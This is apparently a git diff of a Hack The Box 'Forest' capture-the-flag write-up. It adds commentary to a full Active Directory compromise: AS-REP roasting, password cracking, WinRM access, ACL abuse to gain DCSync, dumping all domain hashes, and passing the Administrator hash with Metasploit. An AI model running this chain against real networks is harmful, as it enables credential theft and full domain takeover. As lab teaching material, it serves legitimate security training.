@@ -1,4 +1,5 @@
 
+
 [logo]: https://github.com/Zer0CodeX/Hack-The-Box/raw/master/Forest.png
 ![alt text](https://github.com/Zer0CodeX/Hack-The-Box/raw/master/Forest.png "Forest")
 
@@ -81,13 +82,14 @@ Host script results:
 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 500.27 seconds
 ```
-We got some useful informations about the box which acting as a Domain controller,
-Computer name: FOREST
-OS: Windows Server 2016 Standard
+We got some useful informations about the box which acting as a Domain controller, 
+Computer name: FOREST, 
+OS: Windows Server 2016 Standard, 
 Domain name: htb.local
 
 ## Impacket: GetADUsers.py
-You can also use GetADUsers.py from Impacket to enumerate all users on the server
+Lets use GetADUsers.py from Impacket to dump Active Directory users 
+
 ```console
 root@test:~/tools/Windows/impacket/examples# python GetADUsers.py -all -dc-ip 10.10.10.161 htb.local/ | cut -d " " -f 1 |tee /root/HTB/Forest/users
 Impacket
@@ -128,7 +130,10 @@ mark
 santi
 jan
 ```
-## Impacket: GetNPUsers.py
+## Impacket: GetNPUsers.py 
+
+after saving users to file lets use GetNPUsers.py to dump users hashes from Active Directory 
+
 ```console
 root@test:~/tools/Windows/impacket/examples# python GetNPUsers.py htb.local/ -usersfile /root/HTB/Forest/users -dc-ip 10.10.10.161 -format hashcat -outputfile /root/HTB/Forest/hashes
 Impacket v0.9.21-dev - Copyright 2019 SecureAuth Corporation
@@ -170,11 +175,13 @@ Impacket v0.9.21-dev - Copyright 2019 SecureAuth Corporation
 [-] User santi doesn't have UF_DONT_REQUIRE_PREAUTH set
 [-] User jan doesn't have UF_DONT_REQUIRE_PREAUTH set
 ```
+and we successfully got hash for user "svc-alfresco"
 ```console
 root@test:~/tools/Windows/impacket/examples# cat /root/HTB/Forest/hashes
 $krb5asrep$23$svc-alfresco@HTB.LOCAL:ead9ec2fc260fbda2f1697e3bd855564$c57e09ec984c5d72a66989c63b90c68eac5b309a4cb82890b4734dfc169c5f456ee9ef6ccc21d490d56a30ee0ed7cd13031b29f518d19a8a38780c64fe62f12db584b6f164cf47b9b2e2360983a16deebd8f43562a04edfa8bf5e9aeab56ae74eadec7df54845f4ce3b42609e36a222e56ac6ae23a2b4c8435d90ceb0d2c6526ccae1af3ea0e5d23003be8aefbbd407a4de36a35fb7056d06e503592a63878adbd9f80a979010a261ef397b55eae05daaeedb2ce3d2c8c6b21e815d8eeb4db5d4820b7ddccd44ad1c169828f6a95d16c68cca0c3cff32a08af39b917f9382bbe723e24e0df69
 ```
 ## John The Ripper
+lets crack the hash using John The Ripper and rockyou passwords list
 ```console
 root@test:~/tools/Windows/impacket/examples# john /root/HTB/Forest/hashes --wordlist=/usr/share/wordlists/rockyou.txt
 Using default input encoding: UTF-8
@@ -185,10 +192,15 @@ s3rvice          ($krb5asrep$23$svc-alfresco@HTB.LOCAL)
 1g 0:00:00:14 DONE (2020-01-23 10:52) 0.06988g/s 285517p/s 285517c/s 285517C/s s4553592..s3r2s1
 Use the "--show" option to display all of the cracked passwords reliably
 Session completed
-
 ```
+We got the password "s3rvice"
 
 ## Evil-WinRM
+as we got in nmap results 5985 port is open which used for windows remote management 
+```markdown
+5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+```
+Lets use Evil-WinRM to connect to the machine using the credentials we have . 
 ```console
 root@test:~/tools/Windows/evil-winrm# ruby evil-winrm.rb -u svc-alfresco -p s3rvice -i 10.10.10.161
 
@@ -200,6 +212,8 @@ Info: Establishing connection to remote endpoint
 ```
 
 ## BloodHound
+Lets start AD enumeration using BloodHound to Audit all AD objects and ACLs
+ 
 ```console
 *Evil-WinRM* PS C:\Users\svc-alfresco\Documents> upload /root/tools/Windows/BloodHound/Ingestors/SharpHound.ps1
 Info: Uploading /root/tools/Windows/BloodHound/Ingestors/SharpHound.ps1 to C:\Users\svc-alfresco\Documents\SharpHound.ps1                                                                                   
@@ -250,9 +264,12 @@ root@test:/usr/share/neo4j/bin# bloodhound
 
 
 #### Shortest Path to Domain Admins: 
+Now got a valid path for privileged escalation to Domain Admin
+    
 ![alt text](https://github.com/Zer0CodeX/Hack-The-Box/raw/master/BloodHound.png "BloodHound")
 
 ## ACLPwn.py
+also we can use ACLPwn.py to determine valid paths to Domain Admins   
 ```console
 root@test:~/HTB/Forest# aclpwn -f svc-alfresco -ft user -t 'HTB.LOCAL' -tt domain -d htb.local -dry
 [!] Unsupported operation: GenericAll on EXCH01.HTB.LOCAL (Computer)
@@ -266,6 +283,7 @@ Path [1]: (SVC-ALFRESCO@HTB.LOCAL)-[MemberOf]->(SERVICE ACCOUNTS@HTB.LOCAL)-[Mem
 Please choose a path [0-1] 
 ```
 ##  PowerView
+Lets use PowerView to create a user and add it to 'EXCHANGE WINDOWS PERMISSIONS' group
 ```console
 *Evil-WinRM* PS C:\Users\svc-alfresco\Documents> upload /root/tools/PowerSploit/Recon/PowerView.ps1
 Info: Uploading /root/tools/PowerSploit/Recon/PowerView.ps1 to C:\Users\svc-alfresco\Documents\PowerView.ps1                                                                                                
@@ -344,8 +362,12 @@ Info: Download successful!
 
 ```
 #### Shortest Path from Zer0Code to Domain Admins: 
+Now we have shorter path to Domain Admins
+
 ![alt text](https://github.com/Zer0CodeX/Hack-The-Box/raw/master/BloodHound2.png "BloodHound")
 
+## ACLPwn.py
+We can also use ACLPwn.py determine required actions to escalate our user to Domain admin using -dry flag 
 ```console
 root@test:~/HTB/Forest# aclpwn -f zer0code -ft user -t 'HTB.LOCAL' -tt domain -d htb.local -dry
 [+] Path found!
@@ -353,7 +375,7 @@ Path: (ZER0CODE@HTB.LOCAL)-[MemberOf]->(EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL)-
 [+] Path validated, the following modifications are required for exploitation in the current configuration:
 [-] Modifying domain DACL to give DCSync rights to ZER0CODE
 ```
-
+and using it to apply necessary action by pointing to the server with -s flag  
 ```console
 root@test:~/HTB/Forest# aclpwn -f zer0code -ft user -t 'HTB.LOCAL' -tt domain -d htb.local -s 10.10.10.161
 Please supply the password or LM:NTLM hashes of the account you are escalating from: 
@@ -367,6 +389,7 @@ Path: (ZER0CODE@HTB.LOCAL)-[MemberOf]->(EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL)-
 ```
 
 ## Impacket: secretsdump.py
+as our user now have DCSync rights lets dump AD users hashes using secretsdump.py from impacket
 ```console
 root@test:~/tools/Windows/impacket/examples# python secretsdump.py -dc-ip 10.10.10.161 htb.local/zer0code:zerocode@10.10.10.161 -outputfile hashes.txt
 Impacket v0.9.21-dev - Copyright 2019 SecureAuth Corporation
@@ -474,7 +497,9 @@ EXCH01$:aes128-cts-hmac-sha1-96:9ceffb340a70b055304c3cd0583edf4e
 EXCH01$:des-cbc-md5:8c45f44c16975129
 [*] Cleaning up... 
 ```
+and We got the hash for Administrator 
 ## Pass The Hash with Metasploit
+Lets pass the hash with MSF and get a meterpreter session on the machine
 ```console
 msf5 exploit(windows/smb/psexec) > options
 
@@ -526,7 +551,9 @@ Process 3576 created.
 Channel 1 created.
 Microsoft Windows [Version 10.0.14393]
 (c) 2016 Microsoft Corporation. All rights reserved.
-
+```
+and we got "NT Authority\System"
+```console
 C:\Windows\system32>hostname  
 hostname
 FOREST
@@ -537,11 +564,19 @@ nt authority\system
 ```
 
 ## Resources:
+[https://github.com/SecureAuthCorp/impacket](https://github.com/SecureAuthCorp/impacket)
+
+[https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-with-bloodhound-on-kali-linux](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-with-bloodhound-on-kali-linux)
+
+[https://github.com/gdedrouas/Exchange-AD-Privesc/blob/master/DomainObject/DomainObject.md](https://github.com/gdedrouas/Exchange-AD-Privesc/blob/master/DomainObject/DomainObject.md)
+
+[https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/](https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/)
+
 [https://securityonline.info/aclpwn/](https://securityonline.info/aclpwn/)
 
 [https://www.offensive-security.com/metasploit-unleashed/psexec-pass-hash/](https://www.offensive-security.com/metasploit-unleashed/psexec-pass-hash/)
 
-[https://github.com/SecureAuthCorp/impacket](https://github.com/SecureAuthCorp/impacket)
+
 
 
 [![alt text](https://www.hackthebox.eu/badge/image/131282)](https://www.hackthebox.eu/profile/131282 "Zer0Code")
